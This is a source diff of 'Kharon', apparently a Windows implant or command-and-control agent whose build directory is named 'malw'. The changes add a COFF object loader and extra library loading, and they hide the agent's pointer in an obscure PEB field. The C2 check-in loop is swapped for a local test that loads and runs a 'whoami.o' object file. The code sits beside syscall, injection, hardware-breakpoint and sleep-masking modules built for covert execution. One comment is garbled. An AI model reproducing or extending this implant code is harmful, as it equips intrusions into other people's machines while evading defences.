@@ -7,6 +7,7 @@ EXTERN_C DECLFN auto Main(
 ) -> VOID {
     Kharon Kh;
 
+    Coff      KhCoff( &Kh );
     HwbpEng   KhHwbp( &Kh );
     Syscall   KhSyscall( &Kh );
     Socket    KhSocket( &Kh );
@@ -25,7 +26,8 @@ EXTERN_C DECLFN auto Main(
     Parser    KhParser( &Kh );
     Injection KhInjection( &Kh );
     Mask      KhMask( &Kh );
- 
+
+    Kh.InitCoff( &KhCoff );
     Kh.InitMemory( &KhMemory );
     Kh.InitHwbp( &KhHwbp );
     Kh.InitSyscall( &KhSyscall );
@@ -79,6 +81,9 @@ auto DECLFN Kharon::Init(
     Shell32.Handle   = LdrLoad::Module( Hsh::Str<CHAR>( "shell32.dll" ) );
     Cryptbase.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "cryptbase.dll" ) );
     Ws2_32.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "ws2_32.dll" ) );
+    Msvcrt.Handle    = LdrLoad::Module( Hsh::Str<CHAR>( "msvcrt.dll" ) );
+
+    Lib->Load( "secur32.dll" );
 
     if ( !Mscoree.Handle   ) Mscoree.Handle   = Lib->Load( "mscoree.dll" );
     if ( !Advapi32.Handle  ) Advapi32.Handle  = Lib->Load( "advapi32.dll" );
@@ -88,6 +93,7 @@ auto DECLFN Kharon::Init(
     if ( !Shell32.Handle   ) Shell32.Handle   = Lib->Load( "shell32.dll" );
     if ( !Cryptbase.Handle ) Cryptbase.Handle = Lib->Load( "cryptbase.dll" );
     if ( !Ws2_32.Handle    ) Ws2_32.Handle    = Lib->Load( "ws2_32.dll" );
+    if ( !Msvcrt.Handle    ) Msvcrt.Handle    = Lib->Load( "msvcrt.dll" );
 
     RSL_IMP( Mscoree );
     RSL_IMP( Advapi32 );
@@ -96,6 +102,7 @@ auto DECLFN Kharon::Init(
     RSL_IMP( Shell32 );
     RSL_IMP( Cryptbase );
     RSL_IMP( Ws2_32 );
+    RSL_IMP( Msvcrt );
 
     KhDbgz( "library kernel32.dll  loaded at %p and functions resolveds", Krnl32.Handle    );
     KhDbgz( "library ntdll.dll     loaded at %p and functions resolveds", Ntdll.Handle     );
@@ -107,8 +114,13 @@ auto DECLFN Kharon::Init(
     KhDbgz( "library shell32.dll   loaded at %p and functions resolveds", Shell32.Handle   );
     KhDbgz( "library cryptbase.dll loaded at %p and functions resolveds", Cryptbase.Handle );
     KhDbgz( "library ws2_32.dll    loaded at %p and functions resolveds", Ws2_32.Handle    );
+    KhDbgz( "library msvcrt.dll    loaded at %p and functions resolveds", Msvcrt.Handle    );
 
-    /* ========= [ Syscalls Setup ] ========= */
+    /* ========= [ set global kharon instance ] ========= */
+
+    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
+
+    /* ========= [ syscalls s          jh78etup ] ========= */
     Sys->Ext[syAlloc].Address    = U_PTR( Ntdll.NtAllocateVirtualMemory );
     Sys->Ext[syWrite].Address    = U_PTR( Ntdll.NtWriteVirtualMemory );
     Sys->Ext[syOpenProc].Address = U_PTR( Ntdll.NtOpenProcess );
@@ -134,11 +146,11 @@ auto DECLFN Kharon::Init(
 
     ULONG  TmpVal       = 0;
     ULONG  TokenInfoLen = 0;
-    HANDLE TokenHandle  = NULL;
+    HANDLE TokenHandle  = nullptr;
     BOOL   Success      = FALSE;
-    HKEY   KeyHandle    = NULL;
+    HKEY   KeyHandle    = nullptr;
     ULONG  ProcBufferSize    = sizeof( cProcessorName );
-    PSTR   cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
+    PCHAR  cProcessorNameReg = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0";
 
     SYSTEM_INFO     SysInfo   = { 0 };
     MEMORYSTATUSEX  MemInfoEx = { 0 };
@@ -212,7 +224,7 @@ auto DECLFN Kharon::Init(
     );
 
     Advapi32.RegQueryValueExA(
-        KeyHandle, "ProcessorNameString", NULL, NULL,
+        KeyHandle, "ProcessorNameString", nullptr, nullptr,
         B_PTR( cProcessorName ), &ProcBufferSize
     );
 
@@ -253,11 +265,20 @@ auto DECLFN Kharon::Start(
     
     KhDbgz( "initializing the principal routine" );
 
-    Success = Tsp->Checkin();
+    // Success = Tsp->Checkin();
 
-    do {            
-        Mk->Main( Session.SleepTime );
+    HANDLE FileHandle = Krnl32.CreateFileA("D:\\malw\\Kharon\\Agent\\whoami.o", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+    ULONG  FileSize   = Krnl32.GetFileSize( FileHandle, 0 );
+    PBYTE  FileBuff   = (PBYTE)Hp->Alloc( FileSize );
 
-        Tk->Dispatcher();
-    } while( 1 );
+    Krnl32.ReadFile( FileHandle, FileBuff, FileSize, 0, 0 );
+
+    Cf->Loader( FileBuff, FileSize, NULL, 0 );
+
+    Krnl32.WaitForSingleObject( NtCurrentProcess(), 0x50000 );
+    // do {            
+    //     Mk->Main( Session.SleepTime );
+
+    //     Tk->Dispatcher();
+    // } while( 1 );
 }
